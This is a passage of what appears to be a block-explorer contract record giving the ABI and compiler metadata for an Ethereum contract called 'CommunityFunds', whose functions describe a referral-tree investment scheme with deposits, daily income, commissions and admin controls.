}\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"resetMaxOutInWeek\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"investorAddress\",\"type\":\"address\"}],\"name\":\"enableInvestor\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getContractTime\",\"outputs\":[{\"name\":\"_contractStartAt\",\"type\":\"uint256\"},{\"name\":\"_lastReset\",\"type\":\"uint256\"},{\"name\":\"_oneDay\",\"type\":\"uint256\"},{\"name\":\"_lastPayDailyIncome\",\"type\":\"uint256\"},{\"name\":\"_lastPaySystemCommission\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"investorAddress\",\"type\":\"address\"}],\"name\":\"getPercentToMaxOut\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getListInvestor\",\"outputs\":[{\"name\":\"nodeInvestors\",\"type\":\"address[]\"},{\"name\":\"emails\",\"type\":\"bytes32[]\"},{\"name\":\"unpaidSystemCommissions\",\"type\":\"uint256[]\"},{\"name\":\"unpaidDailyIncomes\",\"type\":\"uint256[]\"},{\"name\":\"depositedAmounts\",\"type\":\"uint256[]\"},{\"name\":\"withdrewAmounts\",\"type\":\"uint256[]\"},{\"name\":\"isDisableds\",\"type\":\"bool[]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"investorAddress\",\"type\":\"address\"}],\"name\":\"getInvestorRegularInfo\",\"outputs\":[{\"name\":\"email\",\"type\":\"string\"},{\"name\":\"generation\",\"type\":\"uint256\"},{\"name\":\"rightSell\",\"type\":\"uint256\"},{\"name\":\"leftSell\",\"type\":\"uint256\"},{\"name\":\"reserveCommission\",\"type\":\"uint256\"},{\"name\":\"depositedAmount\",\"type\":\"uint256\"},{\"name\":\"withdrewAmount\",\"type\":\"uint256\"},{\"name\":\"isDisabled\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"presenterAddress\",\"type\":\"address\"},{\"name\":\"presenteeAddress\",\"type\":\"address\"},{\"name\":\"parentAddress\",\"type\":\"address\"},{\"name\":\"presenteeEmail\",\"type\":\"string\"},{\"name\":\"isLeft\",\"type\":\"bool\"}],\"name\":\"putPresentee\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"finishPayDailyIncome\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"investorAddress\",\"type\":\"address\"}],\"name\":\"getInvestorAccountInfo\",\"outputs\":[{\"name\":\"maxOutTimes\",\"type\":\"uint256\"},{\"name\":\"maxOutTimesInWeek\",\"type\":\"uint256\"},{\"name\":\"totalSell\",\"type\":\"uint256\"},{\"name\":\"investorIds\",\"type\":\"bytes32[]\"},{\"name\":\"dailyIncomeWithrewAmount\",\"type\":\"uint256\"},{\"name\":\"unpaidSystemCommission\",\"type\":\"uint256\"},{\"name\":\"unpaidDailyIncome\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"investorAddress\",\"type\":\"address\"},{\"name\":\"times\",\"type\":\"uint256\"}],\"name\":\"paySystemCommissionInvestor\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"maximum\",\"type\":\"uint256\"}],\"name\":\"setMaximumMaxOutInWeek\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"investorAddress\",\"type\":\"address\"}],\"name\":\"getInvestorTreeInfo\",\"outputs\":[{\"name\":\"leftChild\",\"type\":\"address\"},{\"name\":\"rightChild\",\"type\":\"address\"},{\"name\":\"parent\",\"type\":\"address\"},{\"name\":\"presenter\",\"type\":\"address\"},{\"name\":\"sellThisMonth\",\"type\":\"uint256\"},{\"name\":\"lastMaxOut\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getContractInfo\",\"outputs\":[{\"name\":\"_admin\",\"type\":\"address\"},{\"name\":\"_depositedAmountGross\",\"type\":\"uint256\"},{\"name\":\"_developmentFund\",\"type\":\"address\"},{\"name\":\"_operationFund\",\"type\":\"address\"},{\"name\":\"_reserveFund\",\"type\":\"address\"},{\"name\":\"_emergencyAccount\",\"type\":\"address\"},{\"name\":\"_emergencyMode\",\"type\":\"bool\"},{\"name\":\"_investorAddresses\",\"type\":\"address[]\"},{\"name\":\"balance\",\"type\":\"uint256\"},{\"name\":\"_paySystemCommissionTimes\",\"type\":\"uint256\"},{\"name\":\"_maximumMaxOutInWeek\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"from\",\"type\":\"uint256\"},{\"name\":\"to\",\"type\":\"uint256\"}],\"name\":\"paySystemCommissionByIndex\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"level\",\"type\":\"uint256\"}],\"name\":\"setMaxLevelsAddSale\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"ONE_DAY\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"investorAddress\",\"type\":\"address\"},{\"name\":\"start\",\"type\":\"uint256\"},{\"name\":\"end\",\"type\":\"uint256\"}],\"name\":\"getInvestmentsByTime\",\"outputs\":[{\"name\":\"ids\",\"type\":\"bytes32[]\"},{\"name\":\"ats\",\"type\":\"uint256[]\"},{\"name\":\"amounts\",\"type\":\"uint256[]\"},{\"name\":\"emails\",\"type\":\"bytes32[]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"investorAddresses\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getMaxOutUser\",\"outputs\":[{\"name\":\"nodeInvestors\",\"type\":\"address[]\"},{\"name\":\"unpaidSystemCommissions\",\"type\":\"uint256[]\"},{\"name\":\"unpaidDailyIncomes\",\"type\":\"uint256[]\"},{\"name\":\"depositedAmounts\",\"type\":\"uint256[]\"},{\"name\":\"withdrewAmounts\",\"type\":\"uint256[]\"},{\"name\":\"reserveCommissions\",\"type\":\"uint256[]\"},{\"name\":\"isDisableds\",\"type\":\"bool[]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"rootInvestor\",\"type\":\"address\"}],\"name\":\"getInvestorTree\",\"outputs\":[{\"name\":\"nodeInvestors\",\"type\":\"address[]\"},{\"name\":\"emails\",\"type\":\"bytes32[]\"},{\"name\":\"leftSells\",\"type\":\"uint256[]\"},{\"name\":\"rightSells\",\"type\":\"uint256[]\"},{\"name\":\"parents\",\"type\":\"address[]\"},{\"name\":\"generations\",\"type\":\"uint256[]\"},{\"name\":\"deposits\",\"type\":\"uint256[]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"from\",\"type\":\"uint256\"},{\"name\":\"to\",\"type\":\"uint256\"}],\"name\":\"payDailyIncomeByIndex\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"turnOnEmergencyMode\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"finishPaySystemCommission\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"investorAddress\",\"type\":\"address\"}],\"name\":\"getUnpaidSystemCommission\",\"outputs\":[{\"name\":\"unpaid\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"investorAddress\",\"type\":\"address\"},{\"name\":\"times\",\"type\":\"uint256\"}],\"name\":\"payDailyIncomeForInvestor\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"investor\",\"type\":\"address\"}],\"name\":\"revivalInvestor\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"investorAddress\",\"type\":\"address\"},{\"name\":\"start\",\"type\":\"uint256\"},{\"name\":\"end\",\"type\":\"uint256\"}],\"name\":\"getWithdrawalsByTime\",\"outputs\":[{\"name\":\"ids\",\"type\":\"bytes32[]\"},{\"name\":\"ats\",\"type\":\"uint256[]\"},{\"name\":\"amounts\",\"type\":\"uint256[]\"},{\"name\":\"presentees\",\"type\":\"address[]\"},{\"name\":\"reasons\",\"type\":\"uint256[]\"},{\"name\":\"times\",\"type\":\"uint256[]\"},{\"name\":\"emails\",\"type\":\"bytes32[]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"percent\",\"type\":\"uint256\"},{\"name\":\"from\",\"type\":\"uint256\"},{\"name\":\"to\",\"type\":\"uint256\"}],\"name\":\"stopGame\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"user\",\"type\":\"address\"},{\"name\":\"totalSell\",\"type\":\"uint256\"},{\"name\":\"sellThisMonth\",\"type\":\"uint256\"},{\"name\":\"rightSell\",\"type\":\"uint256\"},{\"name\":\"leftSell\",\"type\":\"uint256\"}],\"name\":\"getSystemCommision\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"donate\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"yesInvestors\",\"type\":\"address[]\"},{\"name\":\"noInvestors\",\"type\":\"address[]\"}],\"name\":\"resetGame\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"investorAddress\",\"type\":\"address\"}],\"name\":\"disableInvestor\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getLazyInvestor\",\"outputs\":[{\"name\":\"emails\",\"type\":\"bytes32[]\"},{\"name\":\"addresses\",\"type\":\"address[]\"},{\"name\":\"lastDeposits\",\"type\":\"uint256[]\"},{\"name\":\"depositedAmounts\",\"type\":\"uint256[]\"},{\"name\":\"sellThisMonths\",\"type\":\"uint256[]\"},{\"name\":\"totalSells\",\"type\":\"uint256[]\"},{\"name\":\"maxOuts\",\"type\":\"uint256[]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"cashOutEmergencyMode\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"investorAddress\",\"type\":\"address\"}],\"name\":\"payToReachMaxOut\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"investor\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"times\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"at\",\"type\":\"uint256\"}],\"name\":\"MaxOut\",\"type\":\"event\"}]","ContractName":"CommunityFunds","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://6901bde0862a1489834e36053d73aec5bad822a6fc5ad6c100d522284b35b8b3"}]}